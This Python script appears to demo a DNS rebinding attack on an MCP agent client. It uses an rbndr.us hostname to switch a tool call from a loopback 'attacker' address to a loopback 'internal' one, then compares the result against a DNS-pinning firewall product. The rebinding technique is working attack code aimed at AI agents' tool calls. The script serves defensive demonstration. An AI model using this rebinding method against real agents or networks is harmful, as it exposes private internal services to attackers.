import sys
import os
import asyncio
import socket
import time
from mcp.client.sse import sse_client
from mcp.client.session import ClientSession

# 127.0.0.1 and 127.0.0.2
TARGET_HOST = "7f000001.7f000002.rbndr.us"
TARGET_URL = f"http://{TARGET_HOST}:8000/sse"

async def wait_for_ip(expected_ip: str, timeout: int = 60):
    """
    Forces the script to pause and poll the DNS server until the rbndr.us
    domain flips to the specific IP address we need for the next attack stage.
    This makes this demo deterministic.
    """
    print(f"[*] Waiting for DNS TTL expiration. Polling {TARGET_HOST} for {expected_ip}...")
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        try:
            current_ip = socket.gethostbyname(TARGET_HOST)
            if current_ip == expected_ip:
                print(f"[+] DNS successfully resolved to {current_ip}.")
                return
        except socket.gaierror:
            pass
        await asyncio.sleep(1)
        
    raise TimeoutError(f"DNS did not resolve to {expected_ip} within {timeout} seconds.")

async def execute_demo_payload(session, protected: bool):
    """The core logic of the agent separated so we can run it in both modes."""
    await session.initialize()
    
    print("[+] Session established. Trust built.")
    tools = await session.list_tools()
    print(f"[+] Discovered tools: {[t.name for t in tools.tools]}")
    
    # Stage 2: The Rebind Window
    print("\n[*] Agent needs the weather. Preparing tool execution payload...")
    print("[!] Malicious actor forces a DNS switch...")
    await wait_for_ip("127.0.0.2")
    
    # Stage 3: The Exploit
    print("\n🔥 DNS Rebound! Agent blindly firing tool execution...")
    try:
        # The SDK uses the URL string, triggering a new DNS lookup that hits our target
        result = await session.call_tool("get_weather", arguments={"location": "Amsterdam"})
        print(f"[*] Tool result received: {result}")

        if protected:
            print("\n✅ DEFENSE SUCCESSFUL: The agent received a valid weather response!")
            print("   This proves the payload safely hit the PUBLIC attacker server.")
            print("   Deconvolute's firewall pinned the IP and completely ignored the malicious DNS switch.")

    except Exception as e:
        # We expect an httpx error here if the dummy server doesn't return perfect JSON-RPC
        # but the alert will still print on the target server if unprotected!
        print(f"[*] Note: Execution raised an exception (expected if target is not an MCP server): {e}")

        if not protected:
            print("\n❌ ATTACK SUCCESSFUL: The standard SDK blindly followed the DNS switch!")
            print("   The payload was fired into your PRIVATE internal network (127.0.0.2).")
            print("   The SDK crashed because the internal target does not speak the MCP protocol.")
            print("   Check your 'internal_target.py' console to see the stolen payload.")

async def run_agent(protected: bool):
    # Stage 1: Ensure we connect to the public attacker server first
    await wait_for_ip("127.0.0.1")
    print(f"\n🚀 Agent connecting to discovery endpoint: {TARGET_URL}")

    if protected:
        print("Protected mode active: Deconvolute firewall will pin the IP address.")

        # Import firewall
        from deconvolute.core.api import secure_sse_session
        
        # Generate a temporary policy file required by the Deconvolute API
        policy_path = "scenarios/dns_rebinding/policy.yaml"

        # Isolate the cache state for a clean demo run
        os.environ["DECONVOLUTE_CACHE_DIR"] = "scenarios/dns_rebinding/data"

        # Run with the firewall active
        async with secure_sse_session(TARGET_URL, policy_path=policy_path, pin_dns=True) as session:
            await execute_demo_payload(session, protected)

    else:
        print("⚠️ Unprotected mode active: Using standard vulnerable MCP SDK transport.")
        async with sse_client(TARGET_URL) as (read_stream, write_stream):
            async with ClientSession(read_stream, write_stream) as session:
                await execute_demo_payload(session, protected)

if __name__ == "__main__":
    protected = "--protected" in sys.argv
    try:
        asyncio.run(run_agent(protected))
    except KeyboardInterrupt:
        print("\n[*] Demo interrupted by user.")
    finally:
        print("\n[*] Demo complete. Shutting down event loop.")
        sys.exit(0)